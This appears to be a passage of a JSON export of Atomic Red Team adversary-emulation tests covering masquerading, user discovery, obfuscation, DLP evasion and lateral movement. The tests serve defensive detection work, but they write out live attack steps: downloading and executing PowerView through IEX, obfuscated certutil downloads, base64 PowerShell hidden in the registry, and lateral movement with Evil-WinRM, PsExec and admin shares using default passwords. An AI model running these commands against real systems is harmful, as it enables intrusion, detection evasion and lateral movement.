%temp%\\T1036.003_masquerading.xlsx.vbs /Y\ncopy #{vbs_path} %temp%\\T1036.003_masquerading.png.vbs /Y\ncopy #{ps1_path} %temp%\\T1036.003_masquerading.doc.ps1 /Y\ncopy #{ps1_path} %temp%\\T1036.003_masquerading.pdf.ps1 /Y\ncopy #{ps1_path} %temp%\\T1036.003_masquerading.rtf.ps1 /Y\n%temp%\\T1036.003_masquerading.docx.exe\n%temp%\\T1036.003_masquerading.pdf.exe\n%temp%\\T1036.003_masquerading.ps1.exe\n%temp%\\T1036.003_masquerading.xls.vbs\n%temp%\\T1036.003_masquerading.xlsx.vbs\n%temp%\\T1036.003_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "System File Copied to Unusual Location", "shortName": "T1036", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null", "successCriteria": null}], "techniqueIds": ["clacwm61802zz29mqggx51u69", "clacwm23s00k729mqhtlq9lyz"], "tags": []}, {"data": {"name": "Malware Masquerading and Execution from Zip File", "shortName": "T1036", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | Location of zip file | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip | "}, "executionSteps": [{"description": "Expand-Archive -Path $env:userprofile\\Downloads\\T1036.zip -DestinationPath $env:userprofile\\Downloads\\T1036 -Force\ncd $env:userprofile\\Downloads\\T1036\ncmd /c $env:userprofile\\Downloads\\T1036\\README.cmd >$null 2>$null", "successCriteria": null}], "techniqueIds": ["clacwm61802zz29mqggx51u69"], "tags": []}, {"data": {"name": "User Discovery With Env Vars PowerShell Script", "shortName": "T1033", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the PowerShell environment variables to identify the current logged user.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n", "successCriteria": null}], "techniqueIds": ["clacwm5pc02nm29mqbq290fnt"], "tags": []}, {"data": {"name": "System Owner/User Discovery", "shortName": "T1033", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | Name of remote computer | string | localhost | "}, "executionSteps": [{"description": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm2ia00wc29mqebcc9zch"], "tags": []}, {"data": {"name": "System Owner/User Discovery", "shortName": "T1033", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "users\nw\nwho\n", "successCriteria": null}], "techniqueIds": ["clacwm5pc02nm29mqbq290fnt", "clacwm2ia00wc29mqebcc9zch"], "tags": []}, {"data": {"name": "GetCurrent User with PowerShell Script", "shortName": "T1033", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5pc02nm29mqbq290fnt"], "tags": []}, {"data": {"name": "Find computers where user has session - Stealth mode (PowerView)", "shortName": "T1033", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5pc02nm29mqbq290fnt", "clacwm2ia00wc29mqebcc9zch"], "tags": []}, {"data": {"name": "Data Transfer Size Limits", "shortName": "T1030", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Take a file/directory, split it into 5Mb chunks\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | File name | Path | T1030_urandom | \n | folder_path | Path where the test creates artifacts | Path | /tmp/T1030 | "}, "executionSteps": [{"description": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6m203ma29mqab9717el", "clacwm1me008q29mq83vcb8u8"], "tags": []}, {"data": {"name": "Go compile", "shortName": "T1027.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | source file | Path | PathToAtomicsFolder/T1027.004/src/T1027-004-test.go | "}, "executionSteps": [{"description": "go run #{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ml03n229mq5mf58xwe"], "tags": []}, {"data": {"name": "Dynamic C# Compile", "shortName": "T1027.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is containted in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | exe program containing dynamically compiled C# code | Path | PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe | "}, "executionSteps": [{"description": "Invoke-Expression #{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ml03n229mq5mf58xwe", "clacwm1i0005s29mqddq62wsl"], "tags": []}, {"data": {"name": "Compile After Delivery using csc.exe", "shortName": "T1027.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output compiled binary | Path | C:\\Windows\\Temp\\T1027.004.exe | \n | input_file | C# code that launches calc.exe from a hidden cmd.exe Window | Path | PathToAtomicsFolder\\T1027.004\\src\\calc.cs | "}, "executionSteps": [{"description": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} #{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ml03n229mq5mf58xwe", "clacwm1i0005s29mqddq62wsl"], "tags": []}, {"data": {"name": "CC compile", "shortName": "T1027.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | source file | Path | PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc | "}, "executionSteps": [{"description": "g++ #{input_file} && ./a.out\nclang++ #{input_file} && ./a.out\n", "successCriteria": null}], "techniqueIds": ["clacwm6ml03n229mq5mf58xwe"], "tags": []}, {"data": {"name": "C compile", "shortName": "T1027.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | source file | Path | PathToAtomicsFolder/T1027.004/src/T1027-004-test.c | "}, "executionSteps": [{"description": "gcc #{input_file} && ./a.out\nclang #{input_file} && ./a.out\n", "successCriteria": null}], "techniqueIds": ["clacwm6ml03n229mq5mf58xwe"], "tags": []}, {"data": {"name": "Binary simply packed by UPX (linux)", "shortName": "T1027.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bin_path | Packed binary | Path | PathToAtomicsFolder/T1027.002/bin/linux/test_upx | "}, "executionSteps": [{"description": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "successCriteria": null}], "techniqueIds": ["clacwm6q703qy29mq2gvh47nh", "clacwm2g900uo29mq5n6xhmkq"], "tags": []}, {"data": {"name": "Binary simply packed by UPX", "shortName": "T1027.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bin_path | Packed binary | Path | PathToAtomicsFolder/T1027.002/bin/darwin/test_upx | "}, "executionSteps": [{"description": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "successCriteria": null}], "techniqueIds": ["clacwm6q703qy29mq2gvh47nh", "clacwm2g900uo29mq5n6xhmkq"], "tags": []}, {"data": {"name": "Binary packed by UPX, with modified headers (linux)", "shortName": "T1027.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bin_path | Packed binary | Path | PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed | "}, "executionSteps": [{"description": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "successCriteria": null}], "techniqueIds": ["clacwm6q703qy29mq2gvh47nh", "clacwm2g900uo29mq5n6xhmkq"], "tags": []}, {"data": {"name": "Binary packed by UPX, with modified headers", "shortName": "T1027.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bin_path | Packed binary | Path | PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed | "}, "executionSteps": [{"description": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "successCriteria": null}], "techniqueIds": ["clacwm6q703qy29mq2gvh47nh", "clacwm2g900uo29mq5n6xhmkq"], "tags": []}, {"data": {"name": "Pad Binary to Change Hash - Linux/macOS dd", "shortName": "T1027.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses dd to add a zero to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_pad | Path of binary to be padded | Path | /tmp/evil-binary | "}, "executionSteps": [{"description": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}\n", "successCriteria": null}], "techniqueIds": ["clacwm662034f29mq7dun2le1", "clacwm1ef003g29mqho1v5or8"], "tags": []}, {"data": {"name": "Obfuscated Command Line using special Unicode characters", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. \u1da0) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).\nReference:\nhttps://wietze.github.io/blog/windows-command-line-obfuscation\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_file | URL of file to download | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | \n | local_path | Local path/filename to save the dowloaded file to | Path | Atomic-license.txt | "}, "executionSteps": [{"description": "1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.\n\n\n  certutil \u2014\u0af9u\u0af0rl\u08b0ca\u08e2c\u0defhe  \u2013\u202espli\u0605t\u202e\u202d \u2212\"\u0d4f\u1da0\u0d78\" #{remote_file} #{local_path}\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl"], "tags": []}, {"data": {"name": "Obfuscated Command in PowerShell", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl"], "tags": []}, {"data": {"name": "Execution from Compressed File", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url_path | url to download Exe | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip | "}, "executionSteps": [{"description": "\"%temp%\\temp_T1027.zip\\T1027.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl", "clacwm26l00ma29mq9b8p0epy"], "tags": []}, {"data": {"name": "Execute base64-encoded PowerShell from Windows Registry", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | registry_key_storage | Windows Registry Key to store code | String | HKCU:Software\\Microsoft\\Windows\\CurrentVersion | \n | powershell_command | PowerShell command to encode | String | Write-Host \"Hey, Atomic!\" | \n | registry_entry_storage | Windows Registry entry to store code under key | String | Debug | "}, "executionSteps": [{"description": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl", "clacwm26l00ma29mq9b8p0epy"], "tags": []}, {"data": {"name": "Execute base64-encoded PowerShell", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | powershell_command | PowerShell command to encode | String | Write-Host \"Hey, Atomic!\" | "}, "executionSteps": [{"description": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl", "clacwm26l00ma29mq9b8p0epy"], "tags": []}, {"data": {"name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path of the XLSM file | Path | PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm | \n | ip_address | Destination IP address | String | 127.0.0.1 | "}, "executionSteps": [{"description": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl"], "tags": []}, {"data": {"name": "DLP Evasion via Sensitive Data in VBA Macro over email", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path of the XLSM file | Path | PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm | \n | sender | sender email | String | test@corp.com | \n | receiver | receiver email | String | test@corp.com | \n | smtp_server | SMTP Server IP Address | String | 127.0.0.1 | "}, "executionSteps": [{"description": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl"], "tags": []}, {"data": {"name": "Decode base64 Data into Script", "shortName": "T1027", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | shell_command | command to encode | String | echo Hello from the Atomic Red Team && uname -v | "}, "executionSteps": [{"description": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "successCriteria": null}], "techniqueIds": ["clacwm6il03iw29mqhetg8ncl", "clacwm26l00ma29mq9b8p0epy"], "tags": []}, {"data": {"name": "WinRM Access with Evil-WinRM", "shortName": "T1021.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | Username | String | Domain\\Administrator | \n | destination_address | Remote Host IP or Hostname | String | Target | \n | password | Password | String | P@ssw0rd1 | "}, "executionSteps": [{"description": "evil-winrm -i #{destination_address} -u #{user_name} -p #{password}", "successCriteria": null}], "techniqueIds": ["clacwm66d034s29mq25206k2f", "clacwm2mi010h29mq3nudcyci"], "tags": []}, {"data": {"name": "Remote Code Execution with PS Credentials Using Invoke-Command", "shortName": "T1021.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute Invoke-command on remote host.\n\nUpon successful execution, powershell will execute whoami on specified remote host using `invoke-command`.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | The username running the powershell command | string | $env:USERNAME | \n | remotehost | The remote hostname of the machine you are running the powershell command on. | string | $env:COMPUTERNAME | \n | password | The password to be used with the user provided in the previous input argument. | string | test12345 | "}, "executionSteps": [{"description": "$SecPassword = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential(\"#{username}\", $SecPassword)\nInvoke-Command -ComputerName \"#{remotehost}\" -Credential $Cred -ScriptBlock {whoami}", "successCriteria": null}], "techniqueIds": ["clacwm66d034s29mq25206k2f"], "tags": []}, {"data": {"name": "Invoke-Command", "shortName": "T1021.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute Invoke-command on remote host.\n\nUpon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | host_name | Remote Windows Host Name | String | localhost | \n | remote_command | Command to execute on remote Host | String | ipconfig | "}, "executionSteps": [{"description": "invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}\n", "successCriteria": null}], "techniqueIds": ["clacwm2mi010h29mq3nudcyci"], "tags": []}, {"data": {"name": "Enable Windows Remote Management", "shortName": "T1021.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Enable-PSRemoting -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm66d034s29mq25206k2f", "clacwm2mi010h29mq3nudcyci"], "tags": []}, {"data": {"name": "PowerShell Lateral Movement using MMC20", "shortName": "T1021.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | Name of Computer | String | localhost | "}, "executionSteps": [{"description": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "successCriteria": null}], "techniqueIds": ["clacwm67z036q29mqe9y6fvj7", "clacwm1oy00ag29mq229efeps"], "tags": []}, {"data": {"name": "Map Admin Share PowerShell", "shortName": "T1021.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Map Admin share utilizing PowerShell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | share_name | Examples C$, IPC$, Admin$ | String | C$ | \n | map_name | Mapped Drive Letter | String | g | \n | computer_name | Target Computer Name | String | Target | "}, "executionSteps": [{"description": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm634031t29mqfw9a9hta", "clacwm2d300rs29mqa4b7d9ks"], "tags": []}, {"data": {"name": "Map admin share", "shortName": "T1021.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Connecting To Remote Shares\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | Username | String | DOMAIN\\Administrator | \n | share_name | Examples C$, IPC$, Admin$ | String | C$ | \n | password | Password | String | P@ssw0rd1 | \n | computer_name | Target Computer Name | String | Target | "}, "executionSteps": [{"description": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm634031t29mqfw9a9hta", "clacwm2d300rs29mqa4b7d9ks"], "tags": []}, {"data": {"name": "Execute command writing output to local Admin Share", "shortName": "T1021.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Remote computer to receive the copy and execute the file | String | output.txt | \n | command_to_execute | Command to execute for output. | String | hostname | "}, "executionSteps": [{"description": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", "successCriteria": null}], "techniqueIds": ["clacwm634031t29mqfw9a9hta", "clacwm2d300rs29mqa4b7d9ks"], "tags": []}, {"data": {"name": "Copy and Execute File with PsExec", "shortName": "T1021.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_path | File to copy and execute | Path | C:\\Windows\\System32\\cmd.exe | \n | remote_host | Remote computer to receive the copy and execute the file | String | \\\\localhost | \n | psexec_exe | Path to PsExec | string | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "#{psexec_exe} #{remote_host} -accepteula -c #{command_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm634031t29mqfw9a9hta", "clacwm2d300rs29mqa4b7d9ks"], "tags": []}, {"data": {"name": "RDP to Server", "shortName": "T1021.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt an RDP session via Remote Desktop Application over Powershell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | logonserver | ComputerName | String | WIN-DC | \n | username | Username | String | Administrator | \n | password | Password | String | 1password2! | "}, "executionSteps": [{"description": "$Server=\"#{logonserver}\"\n$User=\"#{username}\"\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6rs03sx29mqhyr3a3zo", "clacwm2bo00qq29mq4tv4e8z1"], "tags": []}, {"data": {"name": "RDP to DomainController", "shortName": "T1021.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | 